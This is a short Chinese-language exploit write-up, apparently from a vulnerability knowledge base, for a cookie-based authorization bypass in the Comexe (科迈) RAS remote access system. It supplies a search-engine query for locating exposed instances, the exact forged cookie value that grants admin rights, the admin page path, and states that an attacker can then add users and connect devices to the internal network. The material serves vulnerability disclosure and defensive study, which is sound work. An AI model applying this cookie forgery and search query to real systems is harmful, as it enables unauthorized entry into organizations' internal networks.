# 科迈 RAS系统 Cookie验证越权漏洞

## 漏洞描述

科迈 RAS系统 存在Cookie验证越权，当 RAS_Admin_UserInfo_UserName 设置为 admin 时可访问后台

## 漏洞影响

<a-checkbox checked>科迈 RAS系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="科迈-RAS系统"</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313112037353.png)



添加Cookie

```plain
RAS_Admin_UserInfo_UserName=admin
```



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313112037181.png)



访问 `/Server/CmxUser.php?pgid=UserList`



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313112037479.png)



获取后可以添加用户，授权登陆设备直接接入内网